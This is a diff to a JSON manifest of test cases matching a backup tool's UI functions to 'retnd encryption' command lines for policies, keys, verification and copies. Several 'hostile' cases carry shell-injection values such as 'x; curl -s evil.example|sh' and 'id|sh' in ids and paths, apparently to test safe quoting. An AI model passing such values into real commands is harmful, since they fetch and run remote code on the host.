@@ -10,6 +10,10 @@
       "sha256": "f6705fd7ad323cd123ecba27fb6e1370a62356025130388ce67e7d6de17c9c73"
     },
     {
+      "path": "ui/shared/src/encryption/encryptionCommands.ts",
+      "sha256": "ae15669a2ae016f7ab4395438315b097fa7f1364882b583a23e6c036bde0709b"
+    },
+    {
       "path": "ui/shared/src/hooks/runCommands.ts",
       "sha256": "5c277b88a537cdfc2f2c63aaf47b66f6487e29c42dcc5641d5c658c1d3376048"
     },
@@ -27,7 +31,7 @@
     },
     {
       "path": "ui/shared/src/test/cliTwins.test.ts",
-      "sha256": "49982eaf48b7833fef3cf8427e384798c34d1c96907e8c0bf8075507786ef3f9"
+      "sha256": "161606ab0e3738aae698d2e642cce22e8d6ce4fbffee66db0493afc084c117e5"
     }
   ],
   "twins": [
@@ -366,6 +370,180 @@
       "fn": "addCommand",
       "case": "hostile values",
       "line": "retnd assurance validators add 'x; curl -s evil.example|sh' --pattern 'x; curl -s evil.example|sh' --backup-set 'api-server/x; id|sh' --script FILE"
+    },
+    {
+      "module": "encryption/encryptionCommands",
+      "fn": "policyShowCommand",
+      "case": "the policy",
+      "line": "retnd encryption policy"
+    },
+    {
+      "module": "encryption/encryptionCommands",
+      "fn": "policyPatchCommand",
+      "case": "required, the managed key",
+      "line": "retnd encryption policy patch --mode required --managed"
+    },
+    {
+      "module": "encryption/encryptionCommands",
+      "fn": "policyPatchCommand",
+      "case": "off",
+      "line": "retnd encryption policy patch --mode off"
+    },
+    {
+      "module": "encryption/encryptionCommands",
+      "fn": "policyPatchCommand",
+      "case": "an external file",
+      "line": "retnd encryption policy patch --external-file /etc/retnd/keys/offsite.key"
+    },
+    {
+      "module": "encryption/encryptionCommands",
+      "fn": "policyPatchCommand",
+      "case": "an external variable",
+      "line": "retnd encryption policy patch --external-env RETND_OFFSITE_KEY"
+    },
+    {
+      "module": "encryption/encryptionCommands",
+      "fn": "policyPatchCommand",
+      "case": "an external command, arguments never echoed",
+      "line": "retnd encryption policy patch --external-command '<the command that prints the key>'"
+    },
+    {
+      "module": "encryption/encryptionCommands",
+      "fn": "policyPatchCommand",
+      "case": "a hostile file path",
+      "line": "retnd encryption policy patch --external-file 'x; curl -s evil.example|sh'"
+    },
+    {
+      "module": "encryption/encryptionCommands",
+      "fn": "policyResetCommand",
+      "case": "the policy",
+      "line": "retnd encryption policy reset"
+    },
+    {
+      "module": "encryption/encryptionCommands",
+      "fn": "setEncryptionCommand",
+      "case": "a set, required, the managed key",
+      "line": "retnd encryption backup-set api-server/var-backups --mode required --managed"
+    },
+    {
+      "module": "encryption/encryptionCommands",
+      "fn": "setEncryptionCommand",
+      "case": "a set, off",
+      "line": "retnd encryption backup-set api-server/var-backups --mode off"
+    },
+    {
+      "module": "encryption/encryptionCommands",
+      "fn": "setEncryptionCommand",
+      "case": "a hostile set id",
+      "line": "retnd encryption backup-set 'api-server/x; id|sh' --mode required"
+    },
+    {
+      "module": "encryption/encryptionCommands",
+      "fn": "setEncryptionResetCommand",
+      "case": "a set",
+      "line": "retnd encryption backup-set api-server/var-backups --reset"
+    },
+    {
+      "module": "encryption/encryptionCommands",
+      "fn": "keyListCommand",
+      "case": "the keys",
+      "line": "retnd encryption key list"
+    },
+    {
+      "module": "encryption/encryptionCommands",
+      "fn": "keyCreateCommand",
+      "case": "the first key",
+      "line": "retnd encryption key create"
+    },
+    {
+      "module": "encryption/encryptionCommands",
+      "fn": "keyRotateCommand",
+      "case": "the active key",
+      "line": "retnd encryption key rotate"
+    },
+    {
+      "module": "encryption/encryptionCommands",
+      "fn": "keyRetireCommand",
+      "case": "a key",
+      "line": "retnd encryption key retire mk-2026-08-14-a"
+    },
+    {
+      "module": "encryption/encryptionCommands",
+      "fn": "keyRetireCommand",
+      "case": "a hostile key id",
+      "line": "retnd encryption key retire 'x; curl -s evil.example|sh'"
+    },
+    {
+      "module": "encryption/encryptionCommands",
+      "fn": "keyExportCommand",
+      "case": "a key",
+      "line": "retnd encryption key export mk-2026-11-09-a --out '<a path to write the bundle to>'"
+    },
+    {
+      "module": "encryption/encryptionCommands",
+      "fn": "keyConfirmCommand",
+      "case": "the newest export",
+      "line": "retnd encryption key confirm mk-2026-11-09-a"
+    },
+    {
+      "module": "encryption/encryptionCommands",
+      "fn": "keyConfirmCommand",
+      "case": "a named digest",
+      "line": "retnd encryption key confirm mk-2026-11-09-a --digest abababababababababababababababababababababababababababababababab"
+    },
+    {
+      "module": "encryption/encryptionCommands",
+      "fn": "providerTestCommand",
+      "case": "a managed key",
+      "line": "retnd encryption provider test --managed-key mk-2026-11-09-a"
+    },
+    {
+      "module": "encryption/encryptionCommands",
+      "fn": "providerTestCommand",
+      "case": "an external file",
+      "line": "retnd encryption provider test --external-file /etc/retnd/keys/offsite.key"
+    },
+    {
+      "module": "encryption/encryptionCommands",
+      "fn": "providerTestCommand",
+      "case": "an external variable",
+      "line": "retnd encryption provider test --external-env RETND_OFFSITE_KEY"
+    },
+    {
+      "module": "encryption/encryptionCommands",
+      "fn": "providerTestCommand",
+      "case": "an external command, arguments never echoed",
+      "line": "retnd encryption provider test --external-command '<the command that prints the key>'"
+    },
+    {
+      "module": "encryption/encryptionCommands",
+      "fn": "copiesCommand",
+      "case": "one backup",
+      "line": "retnd encryption copies api-server/var-backups/dump-2026-10-01.tar.gz"
+    },
+    {
+      "module": "encryption/encryptionCommands",
+      "fn": "copiesCommand",
+      "case": "a hostile id",
+      "line": "retnd encryption copies 'api-server/x; id|sh/y; id'"
+    },
+    {
+      "module": "encryption/encryptionCommands",
+      "fn": "verifyCommand",
+      "case": "one backup",
+      "line": "retnd encryption verify api-server/var-backups/dump-2026-10-01.tar.gz"
+    },
+    {
+      "module": "encryption/encryptionCommands",
+      "fn": "verifyCommand",
+      "case": "one copy, egress accepted",
+      "line": "retnd encryption verify api-server/var-backups/dump-2026-10-01.tar.gz --medium offsite_s3 --allow-egress"
+    },
+    {
+      "module": "encryption/encryptionCommands",
+      "fn": "verifyCommand",
+      "case": "a hostile id and medium",
+      "line": "retnd encryption verify 'api-server/x; id|sh/y; id' --medium 'x; curl -s evil.example|sh' --allow-egress"
     },
     {
       "module": "hooks/runCommands",
